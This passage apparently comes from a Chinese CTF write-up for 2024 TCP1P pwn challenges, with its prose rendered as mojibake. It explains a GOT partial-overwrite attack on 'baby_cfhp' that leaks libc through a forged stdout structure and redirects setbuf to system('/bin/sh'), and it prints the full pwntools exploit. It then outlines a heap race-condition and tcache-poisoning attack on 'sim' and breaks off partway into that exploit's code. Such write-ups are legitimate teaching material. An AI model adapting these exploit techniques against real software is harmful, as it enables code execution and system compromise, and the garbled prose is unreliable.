<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exit_got = elf.got.exit</span><br><span class="line">main = elf.sym.main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x70</span></span><br><span class="line">payload = <span class="number">0xD0</span></span><br><span class="line"></span><br><span class="line">tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æƒ³åŠæ³•æ³„æ¼libcåŸºå€ï¼Œä¸ªäººè®¤ä¸ºæœ€éº»çƒ¦çš„éƒ¨åˆ†å°±åœ¨è¿™é‡Œã€‚ç”±äºbssæ®µä¸Šå’Œlibcåœ°å€æœ‰å…³çš„åªæœ‰ä¸‰ä¸ªFILEæŒ‡é’ˆå’Œgotè¡¨é‡Œçš„å‡½æ•°åœ°å€,æ•…ä»å®ƒä»¬å…¥æ‰‹ã€‚</p>
<p>æ€è·¯æ˜¯partial overwrite setbufå‡½æ•°çš„gotè¡¨ï¼ŒæŠŠsetbufå‡½æ•°å˜æˆgetså‡½æ•°ï¼ˆåªæœ‰å€’æ•°ä¸¤ä¸ªå­—èŠ‚ä¸ä¸€æ ·ï¼Œéœ€è¦çˆ†ç ´1&#x2F;16æ¦‚ç‡ï¼‰ï¼Œç„¶åä¿®æ”¹åˆ©ç”¨stdoutä»»æ„è¯»è¯»å‡ºlibcæœ‰å…³åœ°å€ï¼Œé¡ºä¾¿å¾€stderré‡Œè¾¹å†™â€&#x2F;bin&#x2F;shâ€ï¼Œç„¶åå†ä¿®æ”¹setbufçš„gotä¸ºsystem.å› ä¸ºstderræ²¡æœ‰ç”¨åˆ°æ‰€ä»¥é‡Œè¾¹çš„ä¸œè¥¿ä¸ä¼šå˜ï¼Œè¿™æ ·åœ¨ä¸‹ä¸€è½®setbufæ‰§è¡Œsetbuf(stderr)çš„æ—¶å€™å°±èƒ½æ‹¿åˆ°shell.</p>
<ul>
<li>ç”±äºinitæ˜¯ä»¥__attribute__((constructor))ç»™å‡ºçš„ï¼Œå› æ­¤å®ƒè¢«æ³¨å†Œåˆ°äº†init_arrayä¸­ï¼Œåœ¨æ‰§è¡Œ_startæ—¶æœ‰è°ƒç”¨é“¾_start -&gt; libc_start_call_main -&gt; init,æ¯æ¬¡å¾ªç¯éƒ½ä¼šåœ¨mainä¹‹å‰æ‰§è¡Œä¸€æ¬¡initå‡½æ•°ã€‚ä½†æ˜¯partial overwrite setbufå‡½æ•°éœ€è¦å†™ä¸¤æ¬¡ï¼ˆä½ä¸¤ä½å­—èŠ‚ï¼‰ï¼Œå¦‚æœåœ¨åªå†™å®Œä¸€æ¬¡ä¹‹åå†æ¬¡è°ƒç”¨çš„è¯ç¨‹åºå¤§æ¦‚ç‡ä¼šcrashï¼ˆREæˆ–æŒ‡ä»¤ä¸å¯¹é½ï¼‰,é€ æˆä¸å¯é¢„çŸ¥çš„é”™è¯¯ï¼Œå› æ­¤åœ¨è¦†å†™setbufçš„gotæ—¶ä¸èƒ½èµ°main -&gt; exit@got -&gt; _start -&gt; mainé“¾ï¼Œåº”å½“æ¢æˆmain -&gt; exit@got -&gt; mainé“¾</li>
<li>å°†exit@gotæ”¹ä¸ºmainå‡½æ•°åŒæ ·éœ€è¦ä¸¤æ­¥ã€‚è™½ç„¶æˆ‘ä»¬å·²ç»æŠŠæœ«ä½åœ°å€ä¿®æ”¹äº†ï¼Œä½†å°è¯•ä¿®æ”¹å€’æ•°ç¬¬äºŒå­—èŠ‚åœ°å€ï¼Œè®©exit@gotæŒ‡å‘mainå‡½æ•°æŸä¸€ä½ç½®çš„è¡Œä¸ºå…¨éƒ½å¤±è´¥äº†ï¼ˆè¦ä¹ˆæ˜¯æŒ‡ä»¤ä¸å¯¹é½ï¼Œè¦ä¹ˆæ˜¯æ²¡æœ‰æ ˆå¯¹é½ï¼Œå¿…é¡»ä»mainå‡½æ•°æœ€å¼€å§‹çš„åœ°æ–¹è·³è½¬ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†³å®šæ¢ä¸€ä¸ªè°ƒç”¨é“¾ï¼šexit@got -&gt; __stack_chk_fail@plt -&gt; __stack_chk_fail@got -&gt; main</li>
<li>ç”±äº__stack_chk_failä¹Ÿæ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œå› æ­¤__stack_chk_fail@gotä¸ºä¸€ä¸ªæŒ‡å‘pltè¡¨é™„è¿‘çš„<strong>å·²çŸ¥åœ°å€</strong>ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ†ä¸¤æ¬¡ä¿®æ”¹å®ƒä¸ºmainå‡½æ•°åœ°å€ã€‚ä¹‹åï¼Œè¿˜æ˜¯ç”±äºpltè¡¨ä¸_startå‡½æ•°ç¦»å¾—å¾ˆè¿‘ï¼Œæˆ‘ä»¬ä¿®æ”¹exit@gotæŒ‡å‘__stack_chk_fail@pltï¼Œä¾¿å®Œæˆäº†exit@got -&gt; __stack_chk_fail@plt -&gt; __stack_chk_fail@got -&gt; mainè°ƒç”¨é“¾ï¼Œé¿å¼€äº†_startå‡½æ•°å¯¹initå‡½æ•°çš„è°ƒç”¨ï¼Œå¯ä»¥å®‰å…¨åœ°partial overwrite setbufå‡½æ•°ã€‚</li>
</ul>
<p>partial overwrite setbufå‡½æ•°æ—¶ç›´æ¥å‡å®šåä¸¤å­—èŠ‚æ²¡æœ‰åç§»å°±è¡Œï¼Œè¿˜æ˜¯1&#x2F;16å‡ ç‡ã€‚æœ€åå†æŠŠexit@gotæŒ‡å‘_startï¼Œä¾¿å¯ä»¥getshell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./baby_cfhp/chall&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="comment"># nc ctf.tcp1p.team 20011</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">20011</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">payload, ptr</span>):</span><br><span class="line">    tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">    res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">    res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit_got = elf.got.exit</span><br><span class="line">main = elf.sym.main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x70</span></span><br><span class="line">payload = <span class="number">0xD0</span></span><br><span class="line"></span><br><span class="line">tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_chk_fail = <span class="number">0x404018</span></span><br><span class="line">res = calc(<span class="number">0xB6</span>, <span class="number">0x30</span>)</span><br><span class="line">ls(res)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(stack_chk_fail).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x11</span>, <span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(stack_chk_fail + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x80</span>, <span class="number">0xD0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">setbuf_addr = elf.got.setbuf</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x20</span>, <span class="number">0xE0</span>)</span><br><span class="line"><span class="comment"># 0520 gets</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x05</span>, <span class="number">0x7F</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0xD0</span>, <span class="number">0x80</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404070</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">8</span>)) - libc.sym._IO_2_1_stdout_</span><br><span class="line">system = libc_base + libc.sym.system</span><br><span class="line">gets = libc_base + libc.sym.gets</span><br><span class="line"></span><br><span class="line">ls(libc_base)</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x80</span>, <span class="number">0xD0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system0 = system &amp; <span class="number">0xFF</span></span><br><span class="line">system1 = (system &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">system2 = (system &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">gets2 = (gets &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">res = calc(system0, <span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(system1, <span class="number">0x05</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(system2, gets2)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">2</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">res = calc(<span class="number">0xD0</span>, <span class="number">0x80</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="sim"><a href="#sim" class="headerlink" title="sim"></a>sim</h1><hr>
<h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸€ä¸ªé«˜ç‰ˆæœ¬å †é¢˜(libc2.35),ä¿æŠ¤å…¨å¼€ï¼Œæ²¡æœ‰å»é™¤ç¬¦å·ï¼Œæ²¡ç»™libcç»™äº†Dockerfile,libcæ˜¯ä»dockeré‡Œæ‰£å‡ºæ¥çš„</p>
<p><img src="/images/2024TCP1P/sim1.png" alt="sim1"></p>
<p>å¯ä»¥çœ‹åˆ°ç¨‹åºåœ¨è¿›å…¥èœå•å †ä¹‹å‰åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œæœ¬é¢˜çš„æ¼æ´ä¹Ÿæ˜¯é›†ä¸­åœ¨çº¿ç¨‹çš„race conditionä¸Šã€‚</p>
<p>run_controlå‡½æ•°æ ‡å‡†çš„èœå•å †ï¼Œä½†æ˜¯æ²¡æœ‰æ¼æ´ï¼š</p>
<p><img src="/images/2024TCP1P/sim3.png" alt="sim3"></p>
<p>çº¿ç¨‹å‡½æ•°å†…å®¹æœ‰ä¸¤é¡¹ï¼Œåˆ†åˆ«å¯ä»¥åšåˆ°å¤åˆ¶å †å—å†…å®¹å’Œè¾“å‡ºå †å—å†…å®¹ï¼Œéœ€è¦ç”¨å‰å°launchå’Œterminateå‡½æ•°è§¦å‘ï¼š</p>
<p><img src="/images/2024TCP1P/sim2.png" alt="sim2"></p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æ‰§è¡Œçš„æ—¶å€™éƒ½æœ‰è¾ƒé•¿æ—¶é—´çš„sleep,å› æ­¤å¯ä»¥åˆ©ç”¨race conditionåœ¨sleepæ—¶ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªå †å—ï¼Œç»•è¿‡æœ€å¼€å§‹çš„å¯¹é•¿åº¦çš„æ£€æŸ¥ï¼Œå®ç°heap overflowå’Œoverread</p>
<p><img src="/images/2024TCP1P/sim4.png" alt="sim4"></p>
<p>é¢˜ç›®åªèƒ½malloc0x80çš„å †å—ï¼Œé¦–å…ˆè¿ç»­ç”³è¯·åˆ é™¤ä¸ƒä¸ªå †å—ï¼Œç„¶åè¾“å‡ºç¬¬å…«ä¸ªå †å—ã€‚åˆ©ç”¨è¾“å‡ºæ—¶çš„sleepå°†å…¶freeé€ å‡ºunsorted binå¹¶è¾“å‡ºä»è€Œæ‹¿åˆ°libcåŸºåœ°å€ã€‚ç”¨åŒæ ·çš„æ–¹æ³•æ³„æ¼tcache binçš„æŒ‡é’ˆå¾—åˆ°heapåŸºåœ°å€ï¼Œç”¨äºåŠ å¯†æŒ‡é’ˆã€‚</p>
<p>æ­¤æ—¶main_arenaé‡Œæœ‰å­˜æ”¾ç€ä¸ƒä¸ªtcache binçš„å•é“¾è¡¨ï¼Œé¡ºåºä¸ºtcache bin1 -&gt; tcache bin2 -&gt; â€¦â€¦ï¼Œåˆ©ç”¨æ¼æ´å¯ä»¥å¤åˆ¶å †å—ä¸Šè¶…è¿‡è¯¥å †å—sizeçš„å†…å®¹ï¼Œæˆ‘ä»¬æ„é€ å †é£æ°´ï¼Œå°†tcache bin1çš„æŒ‡é’ˆå¤åˆ¶åˆ°tcache bin2å¤„ï¼Œ å®ç°tcache bin1 -&gt; tcache bin2 -&gt; tcache bin2è¿™æ ·çš„ç±»double freeæ•ˆæœï¼Œè¿›è€ŒUAFåˆ©ç”¨tcache bin poisoningå®ç°ä»»æ„å†™ã€‚</p>
<p>ä¸€å¼€å§‹å°è¯•æ‰“IOé“¾ï¼Œä½†æ˜¯åœ¨å¤åˆ¶æ—¶æ€»ä¼šæŠŠå †å—çš„sizeä½å’Œé¢˜ç›®ç»™çš„é•¿åº¦æ ‡è®°å¤åˆ¶åˆ°IOç»“æ„ä½“éœ€è¦ç½®é›¶&#x2F;æ”¾å…¥æœ‰æ•ˆåœ°å€çš„åœ°æ–¹ï¼Œæ— è®ºå¦‚ä½•åç§»å¤åˆ¶éƒ½ä¼šè®¿é—®éæ³•å†…å­˜ï¼Œå‡ºç°sigsegv,å› æ­¤å†³å®šæ‰“ROP.ï¼ˆè¿˜æ˜¯ROPæœ€é è°±ï¼‰</p>
<p>ä»»æ„åˆ†é…å †å—è‡³environæŒ‡é’ˆé™„è¿‘ï¼Œåˆ©ç”¨race conditionçš„overreadè¯»å–environæŒ‡é’ˆè·å¾—æ ˆåœ°å€ã€‚ç¬¬ä¸€æ¬¡æ„é€ tcache bin poisoningæ—¶å¾—åˆ°äº†æŒ‡å‘åŒä¸€ä¸ªå †å—çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥UAFå†æ¬¡æ‰“ä¸€ä¸ªtcache bin poisoning,åˆ†é…åˆ°stackä¸Šå†™å…¥ROPé“¾ï¼Œæœ€ç»ˆæˆåŠŸgetshell.</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 